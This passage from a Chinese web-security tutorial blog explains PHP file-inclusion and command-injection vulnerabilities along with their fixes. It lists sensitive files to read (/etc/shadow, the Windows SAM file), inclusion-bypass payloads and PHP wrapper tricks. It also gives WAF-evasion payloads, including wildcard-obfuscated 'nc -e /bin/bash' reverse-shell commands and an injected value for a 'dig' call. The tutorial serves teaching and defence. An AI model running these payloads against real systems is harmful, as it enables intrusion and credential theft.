定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。</span><br><span class="line">3. 对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</span><br><span class="line"></span><br><span class="line"># -&gt;文件包含漏洞（File Include）</span><br><span class="line"></span><br><span class="line">## 1 有关概念</span><br><span class="line"></span><br><span class="line">前言：</span><br><span class="line"></span><br><span class="line">　　PHP中include和require的区别主要是：include在包含过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会知己报错并退出程序的执行。</span><br><span class="line"></span><br><span class="line">漏洞产生原因：</span><br><span class="line"></span><br><span class="line">　　文件包含函数加载的参数没有经过过滤或者严格定义，可以被用户控制，包含了其他恶意文件，导致执行了非预期的代码。</span><br><span class="line"></span><br><span class="line">分类：</span><br><span class="line"></span><br><span class="line">　　本地文件包含和远程文件包含。</span><br><span class="line"></span><br><span class="line">## 2 本地文件包含</span><br><span class="line"></span><br><span class="line">可利用途径：</span><br><span class="line"></span><br><span class="line">　　·上传图片：图片包含getshell</span><br><span class="line"></span><br><span class="line">　　·读文件：读取php文件</span><br><span class="line"></span><br><span class="line">　　·包含日志文件getshell</span><br><span class="line"></span><br><span class="line">　　·包含&#x2F;proc&#x2F;self&#x2F;environ&#x2F;文件getshell</span><br><span class="line"></span><br><span class="line">　　·有phpinfo可包含临时文件</span><br><span class="line"></span><br><span class="line">　　·包含data:&#x2F;&#x2F;或php:&#x2F;&#x2F;inout等伪协议（需要allow_url_include&#x3D;On）</span><br><span class="line"></span><br><span class="line">### 2.1 目录遍历敏感信息路径</span><br><span class="line"></span><br><span class="line">常见的敏感信息路径</span><br><span class="line"></span><br><span class="line">windows系统：</span><br><span class="line"></span><br><span class="line">　　c:\boot.ini  &#x2F;&#x2F;  查看系统版本</span><br><span class="line"></span><br><span class="line">　　c:\windows\system32\inetsrc\MetaBase.xml  &#x2F;&#x2F;IIS配置文件</span><br><span class="line"></span><br><span class="line">　　c:\windows\repair\sam  &#x2F;&#x2F;存储windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">　　c:\programFiles\mysql\my.ini  &#x2F;&#x2F;MYSQL root密码</span><br><span class="line"></span><br><span class="line">　　c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br><span class="line"></span><br><span class="line">Linux&#x2F;Unix系统</span><br><span class="line"></span><br><span class="line">  &#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line"></span><br><span class="line">  &#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line"></span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line"></span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line"></span><br><span class="line">  &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line"></span><br><span class="line">  &#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br><span class="line"></span><br><span class="line">### 2.2 session文件包含</span><br><span class="line"></span><br><span class="line">利用条件：session存储位置可以获取</span><br><span class="line"></span><br><span class="line">　　获取方法1：通过phpinfo信息获取session存储位置</span><br><span class="line"></span><br><span class="line">　　获取方法2：猜测默认的session存放位置</span><br><span class="line"></span><br><span class="line">　　　　Linux下默认存放在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session目录下</span><br><span class="line"></span><br><span class="line">　　　　windows默认C:\WINDOWS\Temp或集成环境下的tmp文件夹里</span><br><span class="line"></span><br><span class="line">方法：</span><br><span class="line"></span><br><span class="line">　　存在本地文件包含漏洞，可通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell</span><br><span class="line"></span><br><span class="line">### 2.3 有限制本地包含绕过</span><br><span class="line"></span><br><span class="line">绕过方法1：%00 截断</span><br><span class="line"></span><br><span class="line">　　条件：magic_quotes_gpc &#x3D; Off PHP 版本&lt;5.3.4</span><br><span class="line"></span><br><span class="line">　　测试：？filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini%00</span><br><span class="line"></span><br><span class="line">绕过方法2：路径长度截断</span><br><span class="line"></span><br><span class="line">　　条件：windows下目录路径最大长度为256字节，超出部分将丢弃；</span><br><span class="line"></span><br><span class="line"> 　　　  Linux下目录最大长度为4096字节，超出长度将丢弃</span><br><span class="line"></span><br><span class="line">　　测试：?filename&#x3D;text.txt.&#x2F;.&#x2F;.&#x2F;.&#x2F;.  或?filename&#x3D;test.txt.....</span><br><span class="line"></span><br><span class="line">## 3 远程文件包含</span><br><span class="line"></span><br><span class="line">　　前提：服务器的php.ini的配置选项allow_url_fopen和allow_url_include为On，则include&#x2F;require函数式可加载远程文件的。</span><br><span class="line"></span><br><span class="line">**有限制远程包含绕过**</span><br><span class="line"></span><br><span class="line">　测试代码：&lt;?php include($_GET[&#39;filename&#39;].&quot;.html&quot;);?&gt;  多添加了html后缀，到最后远程包含的文件　一会多一个HTML后缀</span><br><span class="line"></span><br><span class="line">**问号绕过**</span><br><span class="line"></span><br><span class="line">　　测试：？filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt?</span><br><span class="line"></span><br><span class="line">**#号绕过**</span><br><span class="line"></span><br><span class="line">　　测试：?filenamr&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%23</span><br><span class="line"></span><br><span class="line">**空格绕过**</span><br><span class="line"></span><br><span class="line">　　测试：?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%20</span><br><span class="line"></span><br><span class="line">## 4 PHP伪协议使用</span><br><span class="line"></span><br><span class="line">**php:&#x2F;&#x2F;filter(本地磁盘文件读取)**</span><br><span class="line"></span><br><span class="line">条件:只是读取，需要开启allow_url_fopen，不需开启allow_url_include</span><br><span class="line"></span><br><span class="line">用法：?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xx.php</span><br><span class="line"></span><br><span class="line">　　或：?filwname&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xx.php</span><br><span class="line"></span><br><span class="line">**php:&#x2F;&#x2F;input(读取post文件)**</span><br><span class="line"></span><br><span class="line">　　　遇到file_get_contents()就要想着用php:&#x2F;&#x2F;input绕过，因PHP伪协议也可里要补发http协议，即可使用post方式传递数据。</span><br><span class="line"></span><br><span class="line">测试代码：&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">用法</span><br><span class="line"></span><br><span class="line">![img](https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1645931&#x2F;201907&#x2F;1645931-20190708110528662-1536128151.png)</span><br><span class="line"></span><br><span class="line">**php:&#x2F;&#x2F;input(木马写入)**</span><br><span class="line"></span><br><span class="line">条件：allow_url_fopen和allow_url_include同时开启 （PHP&lt;5.3.0）</span><br><span class="line"></span><br><span class="line">测试代码：</span><br><span class="line"></span><br><span class="line">　　![img](https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1645931&#x2F;201907&#x2F;1645931-20190708110825603-1630205913.png)</span><br><span class="line"></span><br><span class="line">用法：　　</span><br><span class="line"></span><br><span class="line">　　![img](https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1645931&#x2F;201907&#x2F;1645931-20190708110843553-2039086024.png)</span><br><span class="line"></span><br><span class="line">**php:&#x2F;&#x2F;input(命令执行)**</span><br><span class="line"></span><br><span class="line">条件：allow_url_fopen和allow_url_include同时开启 （PHP&lt;5.3.0）</span><br><span class="line"></span><br><span class="line"> 测试代码：　　</span><br><span class="line"></span><br><span class="line">　　　　　　　　　　　　　　![img](https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1645931&#x2F;201907&#x2F;1645931-20190708111139300-1520710133.png)</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line"></span><br><span class="line">　　　　![img](https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1645931&#x2F;201907&#x2F;1645931-20190708111205015-548522362.png)</span><br><span class="line"></span><br><span class="line">**zip:&#x2F;&#x2F;伪协议**</span><br><span class="line"></span><br><span class="line">条件： PHP &gt; &#x3D;5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</span><br><span class="line"></span><br><span class="line">用法：?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] zip:&#x2F;&#x2F;xxx.png#shell.php </span><br><span class="line"></span><br><span class="line">## 5 漏洞挖掘</span><br><span class="line"></span><br><span class="line">无通用性方法</span><br><span class="line"></span><br><span class="line">特定CMS，特定版本可能存在</span><br><span class="line"></span><br><span class="line">web漏洞扫描器扫描</span><br><span class="line"></span><br><span class="line">## 6修复方案</span><br><span class="line"></span><br><span class="line">PHP中可使用open_basedir配置限制访问限制在指定的区域</span><br><span class="line"></span><br><span class="line">过滤.(点)&#x2F;(反斜杠)\(斜杠)</span><br><span class="line"></span><br><span class="line">进制服务器远程文件包含</span><br><span class="line"></span><br><span class="line"># -&gt;命令执行漏洞</span><br><span class="line"></span><br><span class="line">## **命令执行漏洞原理：**</span><br><span class="line"></span><br><span class="line">应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</span><br><span class="line"></span><br><span class="line">## **命令执行漏洞利用条件：**</span><br><span class="line"></span><br><span class="line">1. 应用调用执行系统命令的函数</span><br><span class="line">2. 将用户输入作为系统命令的参数拼接到了命令行中</span><br><span class="line">3. 没有对用户输入进行过滤或过滤不严</span><br><span class="line"></span><br><span class="line">## **漏洞分类：**</span><br><span class="line"></span><br><span class="line">- 代码层过滤不严</span><br><span class="line"></span><br><span class="line">商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(&quot;&#x2F;bin&#x2F;program --arg $arg&quot;);</span><br><span class="line"></span><br><span class="line">- 系统的漏洞造成命令注入</span><br><span class="line"></span><br><span class="line">bash破壳漏洞（CVE-2014-6271）</span><br><span class="line"></span><br><span class="line">- 调用的第三方组件存在代码执行漏洞</span><br><span class="line"></span><br><span class="line">如wordPress中用来处理图片的imageMagick组件</span><br><span class="line">JAVA中的命令执行漏洞（struts2&#x2F;ElasticsearchGroovy等）</span><br><span class="line">ThinkPHP命令执行</span><br><span class="line"></span><br><span class="line">## **漏洞危害：**</span><br><span class="line"></span><br><span class="line">1. 继承Web服务程序的权限去执行系统命令或读写文件</span><br><span class="line">2. 反弹shell</span><br><span class="line">3. 控制整个网站甚至服务器</span><br><span class="line">4. 进一步内网渗透</span><br><span class="line">5. 等等</span><br><span class="line"></span><br><span class="line">命令拼接符</span><br><span class="line">|、||、&amp;、&amp;&amp;的区别：</span><br><span class="line">&amp;：无论左边是false还是true，右边都执行</span><br><span class="line">&amp;&amp;：具有短路效果，左边是false，右边不执行。</span><br><span class="line">|:无论左边是false还是true，右边都会执行</span><br><span class="line">||：具有短路效果，左边是true，右边不执行。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">代码执行：</span><br><span class="line">利用系统函数实现命令执行，在php下，允许命令执行的函数有：</span><br><span class="line">eval（）、assert（）、preg_replace（）、call_user_func（）</span><br><span class="line">如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞</span><br><span class="line"></span><br><span class="line">其他函数</span><br><span class="line">ob_start（）、unserialize（）、creat_function（）</span><br><span class="line">、usort（）、uasort（）、uksort（）、</span><br><span class="line">array_filter（）、</span><br><span class="line">array_reduce（）、</span><br><span class="line">array_map（）......</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">**系统命令执行漏洞**</span><br><span class="line">system（）</span><br><span class="line">exec（）</span><br><span class="line">shell_exec（）</span><br><span class="line">passthru（）</span><br><span class="line">pcntl_exec（）</span><br><span class="line">popen（）</span><br><span class="line">proc_open（）</span><br><span class="line">反引号</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">**命令执行WAF绕过技巧**</span><br><span class="line">**技巧一：通配符**</span><br><span class="line">ls-l</span><br><span class="line">使用通配符</span><br><span class="line">&#x2F;?in&#x2F;?s-l</span><br><span class="line"></span><br><span class="line">&#x2F;???&#x2F;??t &#x2F;??c&#x2F;p???w?</span><br><span class="line">有时候WAF不允许使用太多的？号</span><br><span class="line">&#x2F;?in&#x2F;cat&#x2F;?tc&#x2F;p?sswd</span><br><span class="line"></span><br><span class="line">NC反弹shell:</span><br><span class="line">nc -e &#x2F;bin&#x2F;bash 127.0.0.1 3737</span><br><span class="line">为了避免符号，可以将IP地址转换成整型。</span><br><span class="line">127.0.0.1-&gt;2130706433</span><br><span class="line"></span><br><span class="line">使用通配符</span><br><span class="line">root@kali:~#&#x2F;??n&#x2F;?c -e&#x2F;??n&#x2F;b??h 2130706433 3737</span><br><span class="line"></span><br><span class="line">**技巧二：连接符**</span><br><span class="line"></span><br><span class="line">![img](https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1646039&#x2F;201909&#x2F;1646039-20190904124248741-71863935.png)</span><br><span class="line"></span><br><span class="line">**技巧三：未初始化的bash变量**</span><br><span class="line">在bash环境中允许我们使用未初始化的bash变量，如何</span><br><span class="line">$a ,$b,$c</span><br><span class="line">我们事先并没有定义它们，输出看看:</span><br><span class="line">root@kali:~# echo $a</span><br><span class="line">root@kali:~# echo $b</span><br><span class="line">root@kali:~# echo $c</span><br><span class="line">root@kali:~#</span><br><span class="line">未初始化的变量值都是null</span><br><span class="line"></span><br><span class="line">读取&#x2F;etc&#x2F;passwd:</span><br><span class="line">cat$a &#x2F;etc$a&#x2F;passwd$a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">测试WAF</span><br><span class="line">测试代码：</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;OK&quot;;</span><br><span class="line">system(&#39;dig&#39;.$_GET[&#39;host&#39;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">www.baidu.com;$s&#x2F;bin$s&#x2F;which$s nc$s</span><br><span class="line">反弹shell:</span><br><span class="line">&#x2F;bin$s&#x2F;nc$s -e&#x2F;bin$s&#x2F;bash$s 2130706433 3737</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">## **漏洞修复：**</span><br><span class="line"></span><br><span class="line">1. **尽量少用执行命令的函数或者直接禁用**</span><br><span class="line">2. **参数值尽量使用引号包括**</span><br><span class="line">3. **在使用动态函数之前，确保使用的函数是指定的函数之一**</span><br><span class="line">4. **在进入执行命令的函数&#x2F;方法之前，对参数进行过滤，对敏感字符进行转义**</span><br><span class="line">5. **对PHP语言来说，不能完全控制的危险函数最好不要使用**</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
